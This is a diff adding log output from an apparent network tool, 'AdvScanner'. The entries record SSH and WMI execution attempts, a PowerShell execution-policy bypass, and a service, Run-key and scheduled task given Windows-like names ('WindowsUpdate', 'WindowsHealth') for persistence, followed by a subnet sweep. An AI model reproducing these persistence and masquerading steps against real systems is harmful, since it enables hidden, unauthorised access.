@@ -63,3 +63,22 @@
 2026-05-06 15:24:44,368 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
 2026-05-06 15:24:46,634 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
 2026-05-06 15:24:48,831 | [ERROR] | AdvScanner | [SSH-EXEC] None: [Errno None] Unable to connect to port 22 on 127.0.0.1 or ::1
+2026-05-06 16:09:23,243 | [INFO] | AdvScanner | [INSTALLED-SOFTWARE] Listing on None
+2026-05-06 16:09:23,244 | [INFO] | AdvScanner | [WMI-EXEC] None: powershell -NoProfile -ExecutionPolicy Bypass -Command "
+        Get-ItemPropert
+2026-05-06 16:09:23,245 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
+2026-05-06 16:09:50,397 | [INFO] | AdvScanner | [SVC-INSTALL] None: WindowsUpdateService -> C:\Windows\System32\svchost.exe -k netsvcs
+2026-05-06 16:09:52,702 | [ERROR] | AdvScanner | [SVC-INSTALL] None: [Errno Connection error (None:445)] [Errno 11001] getaddrinfo failed
+2026-05-06 16:09:52,705 | [INFO] | AdvScanner | [REG-WRITE] None: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate = C:\Windows\System32\rundll32.exe
+2026-05-06 16:09:52,707 | [INFO] | AdvScanner | [WMI-EXEC] None: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" 
+2026-05-06 16:09:52,709 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
+2026-05-06 16:09:52,710 | [INFO] | AdvScanner | [REG-WRITE] None: FAILED
+2026-05-06 16:09:52,712 | [INFO] | AdvScanner | [WMI-EXEC] None: schtasks /create /tn "WindowsHealth" /tr "C:\Windows\System32\cmd.exe" /sc onlog
+2026-05-06 16:09:52,714 | [ERROR] | AdvScanner | [WMI-EXEC] None: object of type 'NoneType' has no len()
+2026-05-06 16:10:35,972 | [INFO] | AdvScanner | [ULTRAMAX] GLOBAL NETWORK DISCOVERY INITIATED
+2026-05-06 16:10:36,044 | [INFO] | AdvScanner | [ULTRAMAX] Scanning range 1/10: 192.168.137.0/24
+2026-05-06 16:11:26,647 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.165
+2026-05-06 16:11:27,914 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.165
+2026-05-06 16:11:28,576 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
+2026-05-06 16:11:29,125 | [INFO] | AdvScanner | [ICMP] Found: 192.168.137.201
+2026-05-06 16:15:58,405 | [INFO] | AdvScanner | [TCP-ULTRA] Found: 192.168.137.201 | OS: Windows | Ports: 2
